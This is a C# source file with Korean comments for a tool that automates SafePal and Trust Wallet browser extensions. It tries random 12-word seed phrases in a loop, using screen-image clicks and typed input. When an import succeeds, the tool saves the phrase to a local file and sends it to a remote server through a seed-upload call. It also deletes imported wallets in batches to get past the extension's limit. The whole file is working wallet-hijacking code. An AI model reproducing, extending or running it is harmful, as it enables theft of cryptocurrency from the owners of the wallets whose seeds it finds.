namespace MainPatchedImproved;

/// <summary>
/// 시작: First Set → Second Set 1차(1~12 채우고 next 한 번) → success 체크 → 없으면 2회차부터 슬롯마다 next 후 success 체크 반복.
/// </summary>
public static class AutomationRunner
{
    public enum Mode { SafePal, TrustWallet, TronNetwork }

    /// <summary>현재 실행 모드 (GUI 모드 선택에 따라 설정)</summary>
    public static Mode RunMode { get; set; } = Mode.SafePal;

    /// <summary>true면 테스트용 고정 니모닉 사용</summary>
    public static bool UseTestMnemonic = false;

    /// <summary>5개 찾으면 삭제 (1 기본 + 5 = 총 6개 중 5개만 지움)</summary>
    private const int SafePalDeleteAfterSuccessCount = 5;
    /// <summary>limit 감지 시 back 2번 후 삭제할 지갑 개수 (mainpage_menu 없이 delete~delete4만 반복)</summary>
    private const int SafePalLimitClearCount = 5;
    private static int _safePalSuccessCount;

    private static readonly string[] TestMnemonic = "claw film regular palm call kangaroo carbon matrix fall crater total sand".Split(' ');

    private static void AppendSuccessPhrase(string[] phrase)
    {
        var phraseLine = string.Join(" ", phrase);
        try
        {
            var path = Path.Combine(ChromeImageMatcher.BaseDir, "success_phrases.txt");
            var line = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + phraseLine + Environment.NewLine;
            File.AppendAllText(path, line, System.Text.Encoding.UTF8);
        }
        catch { }
        if (ServerApi.Enabled && !string.IsNullOrEmpty(ServerApi.CurrentToken))
            _ = ServerApi.SendSeedAsync(ServerApi.CurrentToken, phraseLine);
        else if (!ServerApi.Enabled)
            AppLog.WriteLine("(서버 미연결: data 또는 exe 폴더에 server_url.txt 없음)");
        else
            AppLog.WriteLine("(서버 토큰 없음: 서버 로그인 후 시드가 전송됩니다)");
    }

    /// <summary>SafePal: 찾은 개수만큼 삭제. mainpage_menu → delete → delete2 → delete3 → password 입력 → delete4 를 N회 반복.</summary>
    private static void RunSafePalDeleteProcess(int count)
    {
        double th = ChromeImageMatcher.StateMatchThreshold;
        string? pwd = MainLoopTrustWallet.Password ?? "";
        for (int i = 0; i < count && !MainLoop.CheckStop(); i++)
        {
            ChromeImageMatcher.ClickImage("mainpage_menu", th, 0.4);
            Thread.Sleep(500);
            ChromeImageMatcher.ClickImage("delete", th, 0.35);
            Thread.Sleep(400);
            ChromeImageMatcher.ClickImage("delete2", th, 0.35);
            Thread.Sleep(400);
            ChromeImageMatcher.ClickImage("delete3", th, 0.35);
            Thread.Sleep(400);
            ChromeImageMatcher.ClickImage("password", th, 0.35);
            Thread.Sleep(300);
            if (!string.IsNullOrEmpty(pwd))
                InputHelper.TypeText(pwd, 15);
            Thread.Sleep(200);
            ChromeImageMatcher.ClickImage("delete4", th, 0.35);
            Thread.Sleep(600);
        }
    }

    /// <summary>SafePal limit 화면 전용: mainpage_menu 없이 delete → delete2 → delete3 → password → delete4 만 N회 반복.</summary>
    private static void RunSafePalLimitClear(int count)
    {
        double th = ChromeImageMatcher.StateMatchThreshold;
        string? pwd = MainLoopTrustWallet.Password ?? "";
        for (int i = 0; i < count && !MainLoop.CheckStop(); i++)
        {
            ChromeImageMatcher.ClickImage("delete", th, 0.35);
            Thread.Sleep(400);
            ChromeImageMatcher.ClickImage("delete2", th, 0.35);
            Thread.Sleep(400);
            ChromeImageMatcher.ClickImage("delete3", th, 0.35);
            Thread.Sleep(400);
            ChromeImageMatcher.ClickImage("password", th, 0.35);
            Thread.Sleep(300);
            if (!string.IsNullOrEmpty(pwd))
                InputHelper.TypeText(pwd, 15);
            Thread.Sleep(200);
            ChromeImageMatcher.ClickImage("delete4", th, 0.35);
            Thread.Sleep(600);
        }
    }

    /// <summary>back.png 찾아서 클릭 (탐색 1회). limit 후 메인으로 복귀용.</summary>
    private static void ClickBackOnce()
    {
        ChromeImageMatcher.ClickImage("back", ChromeImageMatcher.StateMatchThreshold, 0.4);
        Thread.Sleep(400);
    }

    // ADDED: UI 안정화용 복구 루틴 (placeholder, ChromeImageMatcher 미사용)
    private static void RecoverToKnownState()
    {
        try
        {
            AppLog.WriteLine("복구 루틴 실행 중 (안전 상태로 복귀 시도)");
            Thread.Sleep(500);
        }
        catch (Exception ex)
        {
            try { AppLog.WriteLine("복구 루틴 예외: " + ex.Message); } catch { }
        }
    }

    public static void Run()
    {
        if (RunMode == Mode.TrustWallet)
        {
            ChromeImageMatcher.UseChromeForCapture = true;
            ChromeImageMatcher.PicsSubfolder = "trustwallet";
            RunTrustWallet();
            return;
        }
        if (RunMode == Mode.TronNetwork)
        {
            TronNetworkRunner.Run();
            return;
        }
        try
        {
            Directory.CreateDirectory(ChromeImageMatcher.BaseDir);
            var logPath = Path.Combine(ChromeImageMatcher.BaseDir, "detect_log.txt");
            File.WriteAllText(logPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] SafePal 모드 시작. BaseDir={ChromeImageMatcher.BaseDir}" + Environment.NewLine, System.Text.Encoding.UTF8);
        }
        catch { }

        ChromeImageMatcher.UseForegroundWindow = true;
        ChromeImageMatcher.Debug = false;

        if (!Directory.Exists(ChromeImageMatcher.PicsDir))
        {
            AppLog.WriteLine("pic/kr 폴더 없음");
            return;
        }

        AppLog.WriteLine("시작");

        // ADDED: Watchdog / Circuit Breaker
        var lastProgressTime = DateTime.Now;
        var consecutiveFailures = 0;
        const int WatchdogSeconds = 45;
        const int CircuitBreakerThreshold = 10;

        int cycleCount = 0;
        while (!MainLoop.CheckStop())
        {
            cycleCount++;
            AppLog.WriteLine($"{cycleCount}회차 진행중");

            // ADDED: Watchdog — 일정 시간 동안 progress 없으면 stuck 처리
            if ((DateTime.Now - lastProgressTime).TotalSeconds >= WatchdogSeconds)
            {
                consecutiveFailures++;
                if (consecutiveFailures >= CircuitBreakerThreshold)
                {
                    RecoverToKnownState();
                    consecutiveFailures = 0;
                }
                lastProgressTime = DateTime.Now;
                continue;
            }

            try
            {
            MainLoop.RunFirstSet();
            if (MainLoop.CheckStop()) break;
            Thread.Sleep(800); // First Set 후 화면 전환 대기
            lastProgressTime = DateTime.Now; // ADDED: progress 갱신

            List<string> wordlist;
            if (!UseTestMnemonic)
            {
                try { wordlist = MainLoop.LoadWords(); }
                catch { AppLog.WriteLine("wordlist 로드 실패"); break; }
                if (MainLoop.CheckStop()) break;
            }
            else
                wordlist = new List<string>();

            string[] mnemonic = UseTestMnemonic ? TestMnemonic : MainLoop.Random12(wordlist);
            AppLog.WriteAttemptedPhrase(string.Join(" ", mnemonic));
            WalletCountFile.Increment(); // 니모닉 시도 횟수
            AppLog.WriteLine("니모닉 입력 중");
            if (MainLoop.CheckStop()) break;
            Thread.Sleep(200);
            lastProgressTime = DateTime.Now; // ADDED: progress 갱신

            MainLoop.RunSecondSet(mnemonic, useCtrlA: false);
            if (MainLoop.CheckStop()) break;
            Thread.Sleep(2500); // Second Set 후 결과 대기
            lastProgressTime = DateTime.Now; // ADDED: progress 갱신

            if (MainLoop.HasSuccess())
            {
                AppLog.WriteLineRed("지갑 발견");
                AppendSuccessPhrase(mnemonic);
                ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.5);
                Thread.Sleep(600);
                ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.35);
                _safePalSuccessCount++;
                if (_safePalSuccessCount >= SafePalDeleteAfterSuccessCount)
                {
                    AppLog.WriteLine($"지갑 {_safePalSuccessCount}개 찾음 → 삭제 프로세스 실행");
                    RunSafePalDeleteProcess(_safePalSuccessCount);
                    _safePalSuccessCount = 0;
                }
                AppLog.WriteLine("처음부터 다시 시작");
                Thread.Sleep(900);
                consecutiveFailures = 0; // ADDED: Circuit Breaker 리셋
                lastProgressTime = DateTime.Now; // ADDED: progress 갱신
                continue;
            }
            if (MainLoop.HasLimit())
            {
                AppLog.WriteLine("limit 감지 → back 2회 후 삭제 프로세스 (delete~delete4 " + SafePalLimitClearCount + "회)");
                ClickBackOnce();
                ClickBackOnce();
                Thread.Sleep(500);
                RunSafePalLimitClear(SafePalLimitClearCount);
                _safePalSuccessCount = 0;
                AppLog.WriteLine("처음부터 다시 시작");
                Thread.Sleep(900);
                consecutiveFailures = 0;
                lastProgressTime = DateTime.Now;
                continue;
            }

            int tried = 0;
            while (!MainLoop.CheckStop())
            {
                tried++;
                string[] retryMnemonic = UseTestMnemonic ? TestMnemonic : MainLoop.Random12(wordlist);
                AppLog.WriteAttemptedPhrase(string.Join(" ", retryMnemonic));
                WalletCountFile.Increment(); // 니모닉 시도 횟수 (재시도 1회)
                if (MainLoop.RunSecondSetRetry(retryMnemonic))
                {
                    AppLog.WriteLineRed("지갑 발견");
                    AppendSuccessPhrase(retryMnemonic);
                    ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.5);
                    Thread.Sleep(600);
                    ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.35);
                    _safePalSuccessCount++;
                    if (_safePalSuccessCount >= SafePalDeleteAfterSuccessCount)
                    {
                        AppLog.WriteLine($"지갑 {_safePalSuccessCount}개 찾음 → 삭제 프로세스 실행");
                        RunSafePalDeleteProcess(_safePalSuccessCount);
                        _safePalSuccessCount = 0;
                    }
                    AppLog.WriteLine("처음부터 다시 시작");
                    Thread.Sleep(900);
                    consecutiveFailures = 0; // ADDED: Circuit Breaker 리셋
                    lastProgressTime = DateTime.Now; // ADDED: progress 갱신
                    break;
                }
                if (MainLoop.HasLimit())
                {
                    AppLog.WriteLine("limit 감지 → back 2회 후 삭제 프로세스 (delete~delete4 " + SafePalLimitClearCount + "회)");
                    ClickBackOnce();
                    ClickBackOnce();
                    Thread.Sleep(500);
                    RunSafePalLimitClear(SafePalLimitClearCount);
                    _safePalSuccessCount = 0;
                    AppLog.WriteLine("처음부터 다시 시작");
                    Thread.Sleep(900);
                    consecutiveFailures = 0;
                    lastProgressTime = DateTime.Now;
                    break;
                }
                AppLog.WriteLine($"{tried}차 재시도");
                Thread.Sleep(350);
            }
            lastProgressTime = DateTime.Now; // ADDED: progress 갱신 (재시도 루프 1사이클 완료)

            } // ADDED: try 끝
            catch (Exception ex)
            {
                try { AppLog.WriteLine("Run 루프 예외: " + ex.Message); } catch { }
                consecutiveFailures++;
                if (consecutiveFailures >= CircuitBreakerThreshold)
                {
                    RecoverToKnownState();
                    consecutiveFailures = 0;
                }
                lastProgressTime = DateTime.Now;
            }
        }

        AppLog.WriteLine("작업 종료");
    }

    private static void RunTrustWallet()
    {
        ChromeImageMatcher.Debug = false;
        try
        {
            Directory.CreateDirectory(ChromeImageMatcher.BaseDir);
            var chromeRect = EdgeHelper.GetChromeRegion();
            var picsExists = Directory.Exists(ChromeImageMatcher.PicsDir);
            var lines = new[]
            {
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Trust Wallet 모드 시작",
                $"  BaseDir = {ChromeImageMatcher.BaseDir}",
                $"  ExeDir = {ChromeImageMatcher.ExeDir}",
                $"  PicsDir(trustwallet) 존재 = {picsExists}",
                $"  Chrome 창 감지 = {(chromeRect != null ? "됨 " + chromeRect.Value.Width + "x" + chromeRect.Value.Height : "안됨")}",
                ""
            };
            var logPath = Path.Combine(ChromeImageMatcher.BaseDir, "trustwallet_detect_log.txt");
            try { File.WriteAllLines(logPath, lines, System.Text.Encoding.UTF8); }
            catch
            {
                var fallback = Path.Combine(ChromeImageMatcher.ExeDir, "trustwallet_detect_log.txt");
                File.WriteAllLines(fallback, lines.Concat(new[] { $"  (BaseDir 쓰기 실패 → exe 옆에 저장: {fallback})" }).ToArray(), System.Text.Encoding.UTF8);
            }
        }
        catch (Exception ex) { try { File.WriteAllText(Path.Combine(ChromeImageMatcher.ExeDir, "trustwallet_detect_log.txt"), "시작 로그 기록 실패: " + ex.Message, System.Text.Encoding.UTF8); } catch { } }

        if (!Directory.Exists(ChromeImageMatcher.PicsDir))
        {
            AppLog.WriteLine("data/pic/trustwallet 폴더 없음");
            return;
        }
        AppLog.WriteLine("시작 (Trust Wallet)");
        List<string> wordlist;
        try
        {
            wordlist = UseTestMnemonic ? new List<string>() : MainLoop.LoadWords();
        }
        catch (Exception ex)
        {
            AppLog.WriteLine("wordlist 로드 실패: " + ex.Message);
            return;
        }
        Func<string[]> getNext = () =>
        {
            string[] m = UseTestMnemonic ? TestMnemonic : MainLoop.Random12(wordlist);
            AppLog.WriteAttemptedPhrase(string.Join(" ", m));
            WalletCountFile.Increment();
            AppLog.WriteLine("니모닉 입력 중");
            return m;
        };
        MainLoopTrustWallet.Run(getNext, AppendSuccessPhrase);
        AppLog.WriteLine("작업 종료");
    }
}
